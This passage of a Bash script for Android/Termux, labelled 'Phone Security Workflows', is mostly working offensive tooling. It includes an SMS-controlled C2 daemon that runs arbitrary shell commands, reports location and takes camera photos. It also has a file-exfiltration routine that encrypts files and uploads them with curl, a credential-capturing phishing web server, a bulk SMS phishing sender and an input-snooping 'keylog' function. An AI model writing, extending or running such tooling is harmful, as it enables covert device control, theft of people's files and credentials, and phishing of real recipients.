    removed_apps=$(diff <(cat "$baseline") <(echo "$current") 2>/dev/null | grep "^<" | sed 's/^< package://')
    if [ -n "$new_apps" ]; then
      echo -e "${RED}New apps installed:${RST}"
      echo "$new_apps" | while read -r pkg; do
        echo -e "  ${YLW}+ $pkg${RST}"
      done
      _fire_event "security/app_install" "{\"new_apps\":\"$(echo "$new_apps" | tr '\n' ',')\"}"
    fi
    if [ -n "$removed_apps" ]; then
      echo -e "${WHT}Apps removed:${RST}"
      echo "$removed_apps" | while read -r pkg; do
        echo -e "  ${DIM}- $pkg${RST}"
      done
    fi
    [ -z "$new_apps" ] && [ -z "$removed_apps" ] && echo -e "${GRN}No app changes${RST}"
  else
    echo -e "${WHT}Creating app baseline...${RST}"
  fi
  echo "$current" > "$baseline"

  local total=$(echo "$current" | wc -l)
  echo -e "  ${DIM}Total 3rd-party apps: $total${RST}"
}

wf_keylog() {
  echo -e "${BLD}${CYN}═══ Input Monitor ═══${RST}"
  echo -e "${DIM}Monitoring input events (Ctrl+C to stop)...${RST}"
  echo ""

  echo -e "${WHT}Current focus:${RST}"
  _rish "dumpsys window | grep mCurrentFocus" 2>/dev/null | sed 's/^/  /'

  echo ""
  echo -e "${WHT}Recent input events:${RST}"
  _rish "logcat -d -b events" 2>/dev/null | grep -iE "input|key|focus" | tail -20 | sed 's/^/  /'

  _fire_event "device/keylog" "{\"action\":\"snapshot\"}"
}

# ── SMS-based C2 Fallback ────────────────────────

wf_sms_c2() {
  local approved_file="$C2_HOME/.sms_c2_approved"
  if [ ! -f "$approved_file" ]; then
    echo -e "${RED}No approved numbers configured${RST}"
    echo -e "  Create $approved_file with one phone number per line"
    return 1
  fi

  echo -e "${BLD}${CYN}═══ SMS C2 Daemon ═══${RST}"
  echo -e "${DIM}Polling SMS every 30s for C2: commands...${RST}"
  echo -e "${DIM}Approved numbers: $(cat "$approved_file" | tr '\n' ', ')${RST}"

  local last_id_file="$C2_HOME/.sms_c2_last_id"
  local last_id=0
  [ -f "$last_id_file" ] && last_id=$(cat "$last_id_file" 2>/dev/null || echo 0)

  while true; do
    local inbox
    inbox=$(termux-sms-list -l 5 -t inbox 2>/dev/null)
    [ -z "$inbox" ] && { sleep 30; continue; }

    echo "$inbox" | python3 -c "
import sys, json, subprocess, os

msgs = json.load(sys.stdin)
last = int('${last_id}')
approved = open('${approved_file}').read().strip().split('\n')
approved = [a.strip() for a in approved if a.strip()]
last_file = '${last_id_file}'
c2_home = '${C2_HOME}'

for m in reversed(msgs):
    mid = m.get('_id', 0)
    if mid <= last: continue
    sender = m.get('number','').replace(' ','').replace('-','')
    body = m.get('body','').strip()

    # Check if from approved number and has C2: prefix
    sender_match = any(sender.endswith(a.replace(' ','').replace('-','')[-10:]) for a in approved)
    if not sender_match: continue
    if not body.startswith('C2:'): continue

    cmd = body[3:].strip()
    print(f'C2 CMD from {sender}: {cmd}', flush=True)

    reply = ''
    if cmd == 'status':
        import socket
        reply = f'online {socket.gethostname()}'
    elif cmd == 'location':
        try:
            r = subprocess.run(['termux-location', '-p', 'network', '-r', 'once'], capture_output=True, text=True, timeout=30)
            d = json.loads(r.stdout)
            reply = f\"{d.get('latitude','?')},{d.get('longitude','?')} acc={d.get('accuracy','?')}m\"
        except: reply = 'location failed'
    elif cmd == 'photo':
        try:
            subprocess.run(['termux-camera-photo', '-c', '0', '/sdcard/c2_sms_photo.jpg'], timeout=15)
            reply = 'photo captured'
        except: reply = 'photo failed'
    elif cmd == 'beacon':
        reply = f'alive uptime=TODO'
    elif cmd.startswith('exec '):
        try:
            r = subprocess.run(cmd[5:], shell=True, capture_output=True, text=True, timeout=15)
            reply = (r.stdout + r.stderr)[:140]
        except Exception as e: reply = str(e)[:140]
    else:
        reply = f'unknown: {cmd}'

    # Truncate to 160 chars and reply
    reply = reply[:160]
    try:
        subprocess.run(['termux-sms-send', '-n', sender, reply], timeout=10)
        print(f'  Replied: {reply}', flush=True)
    except: pass

    # Log
    with open(f'{c2_home}/logs/sms_c2.log', 'a') as f:
        from datetime import datetime
        f.write(f'{datetime.now().isoformat()} {sender} -> {cmd} -> {reply}\n')

if msgs:
    with open(last_file, 'w') as f:
        f.write(str(msgs[0].get('_id', 0)))
" 2>/dev/null

    sleep 30
  done
}

# ── File Exfiltration ────────────────────────────

wf_exfil() {
  local path="${1:?Usage: wf exfil <path>}"
  local server="${2:-http://127.0.0.1:9800}"
  local tmpfile="/tmp/exfil_$(date +%s).tar.gz.enc"

  if [ ! -e "$path" ]; then
    echo -e "${RED}Path not found: $path${RST}"
    return 1
  fi

  echo -e "${CYN}Exfiltrating: $path${RST}"

  # Read secret from config
  local secret
  secret=$(python3 -c "import json; print(json.load(open('$C2_HOME/config.json')).get('secret','changeme'))" 2>/dev/null || echo "changeme")

  # Tar + compress + encrypt
  tar czf - "$path" 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -pass "pass:$secret" -out "$tmpfile" 2>/dev/null

  if [ ! -f "$tmpfile" ]; then
    echo -e "${RED}Compression/encryption failed${RST}"
    return 1
  fi

  local size=$(du -h "$tmpfile" 2>/dev/null | cut -f1)
  echo -e "  Encrypted archive: $tmpfile ($size)"

  # Upload
  curl -s -X POST "$server/exfil/upload" \
    -H "Content-Type: application/octet-stream" \
    -H "X-Filename: $(basename "$path").tar.gz.enc" \
    --data-binary "@$tmpfile" >/dev/null 2>&1
  local rc=$?

  rm -f "$tmpfile"

  if [ $rc -eq 0 ]; then
    echo -e "${GRN}Uploaded to $server${RST}"
    _fire_event "exfil/upload" "{\"path\":\"$path\",\"size\":\"$size\"}"
  else
    echo -e "${YLW}Upload failed — encrypted file was at $tmpfile${RST}"
  fi
}

# ── Phishing ─────────────────────────────────────

wf_phish_serve() {
  local port="${1:-8888}"
  local template_dir="$C2_HOME/phish_templates"
  mkdir -p "$template_dir"

  echo -e "${CYN}Starting phishing server on :$port${RST}"
  echo -e "${DIM}Templates: $template_dir${RST}"

  cd "$template_dir"
  python3 -c "
import http.server, json, urllib.request, sys, os

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        cl = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(cl).decode('utf-8', errors='replace') if cl else ''
        # Forward captures to hookserver
        try:
            data = json.dumps({
                'src_ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent',''),
                'path': self.path,
                'data': body[:2000],
                'campaign': 'phone_serve'
            }).encode()
            req = urllib.request.Request('http://127.0.0.1:9800/phish/capture',
                data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=3)
        except: pass
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

    def log_message(self, fmt, *args):
        print(f'  [{self.client_address[0]}] {args[0]}')

http.server.HTTPServer(('0.0.0.0', int(sys.argv[1])), PhishHandler).serve_forever()
" "$port"
}

wf_sms_phish() {
  local numbers_file="${1:?Usage: wf sms-phish <numbers_file> <template>}"
  local template="${2:?Template message required (use {URL} for callback)}"
  local callback_url="${3:-http://YOUR_IP:8888}"

  if [ ! -f "$numbers_file" ]; then
    echo -e "${RED}File not found: $numbers_file${RST}"
    return 1
  fi

  local count=$(wc -l < "$numbers_file")
  echo -e "${CYN}Sending to $count numbers...${RST}"
  echo -e "${DIM}Rate limited: 1 SMS per 5 seconds${RST}"

  local sent=0
  while read -r num; do
    [ -z "$num" ] && continue
    local msg=$(echo "$template" | sed "s|{URL}|$callback_url|g")
    termux-sms-send -n "$num" "$msg" 2>/dev/null
    sent=$((sent + 1))
    echo -e "  ${GRN}[$sent/$count]${RST} -> $num"
    sleep 5  # Rate limit
  done < "$numbers_file"

  echo -e "${GRN}Sent $sent SMS messages${RST}"
  _fire_event "phish/sms_campaign" "{\"sent\":$sent,\"template_length\":${#template}}"
}

# ── Dispatch ─────────────────────────────────────

usage() {
  echo -e "${BLD}${CYN}Phone Security Workflows${RST}"
  echo ""
  echo -e "  ${BLD}Original${RST}"
  echo -e "  ${WHT}wf netdiscover${RST}         Network discovery + ARP + WiFi"
  echo -e "  ${WHT}wf app-audit${RST} [pkg]     App security audit (rish)"
  echo -e "  ${WHT}wf otg${RST}                 USB/OTG attack surface"
  echo -e "  ${WHT}wf wifi${RST}                WiFi security scan"
  echo -e "  ${WHT}wf harden${RST}              Device hardening check"
  echo -e "  ${WHT}wf capture${RST} [start|stop] PCAPdroid traffic capture"
  echo -e "  ${WHT}wf firewall${RST} [status|block] RethinkDNS firewall"
  echo -e "  ${WHT}wf freeze${RST} [dis/enable]  Freeze/unfreeze apps (Shizuku)"
  echo -e "  ${WHT}wf monitor${RST}             Process & network monitor"
  echo -e "  ${WHT}wf logwatch${RST} [filter]   Security log monitor"
  echo -e "  ${WHT}wf recon${RST} <target>      Quick recon from phone"
  echo ""
  echo -e "  ${BLD}SMS & Comms${RST}"
  echo -e "  ${WHT}wf sms-send${RST} <num> <msg>  Send SMS"
  echo -e "  ${WHT}wf sms-monitor${RST}           Check inbox for new SMS"
  echo -e "  ${WHT}wf sms-c2${RST}                SMS-based C2 daemon"
  echo -e "  ${WHT}wf sms-phish${RST} <f> <tpl>   SMS phishing campaign"
  echo ""
  echo -e "  ${BLD}Device Intel${RST}"
  echo -e "  ${WHT}wf device-info${RST}           IMEI, SIM, carrier, battery"
  echo -e "  ${WHT}wf location${RST}              GPS coordinates"
  echo -e "  ${WHT}wf screenshot${RST}            Capture screen (Shizuku)"
  echo -e "  ${WHT}wf camera${RST} [0|1]          Front/rear photo"
  echo -e "  ${WHT}wf clipboard${RST}             Read clipboard"
  echo -e "  ${WHT}wf contacts${RST}              Dump contacts"
  echo -e "  ${WHT}wf call-log${RST}              Recent calls"
  echo -e "  ${WHT}wf content-query${RST} <uri>   Query content provider"
  echo ""
  echo -e "  ${BLD}WiFi/Network Assessment${RST}"
  echo -e "  ${WHT}wf wifi-mon${RST}              WiFi monitor (rogue AP detect)"
  echo -e "  ${WHT}wf arp-watch${RST}             ARP spoof detection"
  echo -e "  ${WHT}wf dns-leak${RST}              DNS leak test"
  echo -e "  ${WHT}wf service-disc${RST}          mDNS + SSDP discovery"
  echo -e "  ${WHT}wf wifi-pass${RST}             Saved WiFi passwords"
  echo -e "  ${WHT}wf pcap${RST}                  Network connection summary"
  echo ""
  echo -e "  ${BLD}Shizuku Advanced${RST}"
  echo -e "  ${WHT}wf call-state${RST}            Call state monitor"
  echo -e "  ${WHT}wf perm${RST} <grant|revoke>   Permission management"
  echo -e "  ${WHT}wf notify${RST} <title> <msg>  Inject notification"
  echo -e "  ${WHT}wf settings${RST} <put|get>    System settings control"
  echo -e "  ${WHT}wf ui${RST} <tap|swipe|text>   UI automation"
  echo -e "  ${WHT}wf app-usage${RST}             Foreground app + history"
  echo -e "  ${WHT}wf device-profile${RST}        Battery, disk, memory"
  echo -e "  ${WHT}wf intent${RST} <action>       Fire intents"
  echo -e "  ${WHT}wf app-watch${RST}             Detect new app installs"
  echo -e "  ${WHT}wf keylog${RST}                Input event monitoring"
  echo ""
  echo -e "  ${BLD}Offensive${RST}"
  echo -e "  ${WHT}wf exfil${RST} <path>          File exfiltration"
  echo -e "  ${WHT}wf phish-serve${RST} [port]    Phishing HTTP server"
}

case "${1}" in
  # Original
  netdiscover|net)  wf_netdiscover ;;
  app-audit|audit)  shift; wf_app_audit "$@" ;;
  otg|usb)          wf_otg ;;
  wifi)             wf_wifi ;;
  harden|check)     wf_harden ;;
  capture|cap)      shift; wf_capture "$@" ;;
  firewall|fw)      shift; wf_firewall "$@" ;;
  freeze|ice)       shift; wf_freeze "$@" ;;
  monitor|mon)      wf_monitor ;;
  logwatch|log)     shift; wf_logwatch "$@" ;;
  recon)            shift; wf_recon "$@" ;;
  # SMS & Comms
  sms-send)         shift; wf_sms_send "$@" ;;
  sms-monitor|sms)  shift; wf_sms_monitor "$@" ;;
  sms-c2)           wf_sms_c2 ;;
  sms-phish)        shift; wf_sms_phish "$@" ;;
  # Device Intel
  device-info|devinfo) wf_device_info ;;
  location|loc)     wf_location ;;
  screenshot|ss)    wf_screenshot ;;
  camera|cam)       shift; wf_camera "$@" ;;
  clipboard|clip)   wf_clipboard ;;
  contacts)         wf_contacts ;;
  call-log|calls)   wf_call_log ;;
  content-query|cq) shift; wf_content_query "$@" ;;
  # WiFi/Network
  wifi-mon|wmon)    wf_wifi_monitor ;;
  arp-watch|arp)    wf_arp_watch ;;
  dns-leak|dns)     wf_dns_leak ;;
  service-disc|svc) wf_service_discovery ;;
  wifi-pass|wpass)  wf_wifi_passwords ;;
  pcap|pcap-analyze) wf_pcap_analyze ;;
  # Shizuku Advanced
  call-state|cstate) wf_call_monitor ;;
  perm)             shift; wf_perm_manage "$@" ;;
  notify)           shift; wf_notify_inject "$@" ;;
  settings|set)     shift; wf_settings "$@" ;;
  ui)               shift; wf_ui_auto "$@" ;;
  app-usage|usage)  wf_app_usage ;;
  device-profile|dp) wf_device_profile ;;
  intent)           shift; wf_intent_fire "$@" ;;
  app-watch|awatch) wf_app_watch ;;
  keylog|klog)      wf_keylog ;;
  # Offensive
  exfil)            shift; wf_exfil "$@" ;;
  phish-serve|phish) shift; wf_phish_serve "$@" ;;
  sms-phish-send)   shift; wf_sms_phish "$@" ;;
  *)                usage ;;
esac
